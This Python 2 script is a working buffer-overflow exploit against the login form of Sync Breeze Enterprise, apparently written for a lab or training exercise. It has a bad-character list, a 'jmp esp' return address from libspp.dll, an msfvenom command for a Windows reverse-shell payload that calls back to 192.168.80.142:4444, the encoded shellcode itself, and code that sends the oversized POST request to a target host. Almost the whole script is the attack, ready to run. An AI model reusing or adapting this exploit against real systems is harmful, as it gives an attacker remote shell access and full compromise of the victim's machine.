import socket
import time

#badchar = \x00\x0a\x0d\x24\x25\x26\x2b\x3d
#Log data, item 71
# Address=10090C83 -> \x83\x0c\x09\x10
# Message=  0x10090c83 : jmp esp |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll)

#└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.142 LPORT=4444 EXITFUNC=thread  -b "\x00\x0a\x0d\x24\x25\x26\x2b\x3d" -f c


shell =""
shell+="\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
shell+="\x8e\x85\x83\xfd\x83\xee\xfc\xe2\xf4\x72\x6d\x01\xfd\x8e\x85"
shell+="\xe3\x74\x6b\xb4\x43\x99\x05\xd5\xb3\x76\xdc\x89\x08\xaf\x9a"
shell+="\x0e\xf1\xd5\x81\x32\xc9\xdb\xbf\x7a\x2f\xc1\xef\xf9\x81\xd1"
shell+="\xae\x44\x4c\xf0\x8f\x42\x61\x0f\xdc\xd2\x08\xaf\x9e\x0e\xc9"
shell+="\xc1\x05\xc9\x92\x85\x6d\xcd\x82\x2c\xdf\x0e\xda\xdd\x8f\x56"
shell+="\x08\xb4\x96\x66\xb9\xb4\x05\xb1\x08\xfc\x58\xb4\x7c\x51\x4f"
shell+="\x4a\x8e\xfc\x49\xbd\x63\x88\x78\x86\xfe\x05\xb5\xf8\xa7\x88"
shell+="\x6a\xdd\x08\xa5\xaa\x84\x50\x9b\x05\x89\xc8\x76\xd6\x99\x82"
shell+="\x2e\x05\x81\x08\xfc\x5e\x0c\xc7\xd9\xaa\xde\xd8\x9c\xd7\xdf"
shell+="\xd2\x02\x6e\xda\xdc\xa7\x05\x97\x68\x70\xd3\xed\xb0\xcf\x8e"
shell+="\x85\xeb\x8a\xfd\xb7\xdc\xa9\xe6\xc9\xf4\xdb\x89\x7a\x56\x45"
shell+="\x1e\x84\x83\xfd\xa7\x41\xd7\xad\xe6\xac\x03\x96\x8e\x7a\x56"
shell+="\xad\xde\xd5\xd3\xbd\xde\xc5\xd3\x95\x64\x8a\x5c\x1d\x71\x50"
shell+="\x14\x97\x8b\xed\x43\x55\xde\x0b\xeb\xff\x8e\x94\xdf\x74\x68"
shell+="\xef\x93\xab\xd9\xed\x1a\x58\xfa\xe4\x7c\x28\x0b\x45\xf7\xf1"
shell+="\x71\xcb\x8b\x88\x62\xed\x73\x48\x2c\xd3\x7c\x28\xe6\xe6\xee"
shell+="\x99\x8e\x0c\x60\xaa\xd9\xd2\xb2\x0b\xe4\x97\xda\xab\x6c\x78"
shell+="\xe5\x3a\xca\xa1\xbf\xfc\x8f\x08\xc7\xd9\x9e\x43\x83\xb9\xda"
shell+="\xd5\xd5\xab\xd8\xc3\xd5\xb3\xd8\xd3\xd0\xab\xe6\xfc\x4f\xc2"
shell+="\x08\x7a\x56\x74\x6e\xcb\xd5\xbb\x71\xb5\xeb\xf5\x09\x98\xe3"
shell+="\x02\x5b\x3e\x63\xe0\xa4\x8f\xeb\x5b\x1b\x38\x1e\x02\x5b\xb9"
shell+="\x85\x81\x84\x05\x78\x1d\xfb\x80\x38\xba\x9d\xf7\xec\x97\x8e"
shell+="\xd6\x7c\x28";



buffer ="A"*780+'\x83\x0c\x09\x10'+'\x90'*20+shell+'\x90'*(1500-780-22-len(shell))
payload="username="+ buffer +"&password=admin"
request=""
request+="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.80.177\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(len(payload))+"\r\n"
request+="Origin: http://192.168.80.177\r\n"
request+="Connection: close\r\n"
request+="Referer: http://192.168.80.177/login\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+=payload

print request

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.80.177",80))
s.send(request)
print s.recv(1024)
s.close()
time.sleep(5)






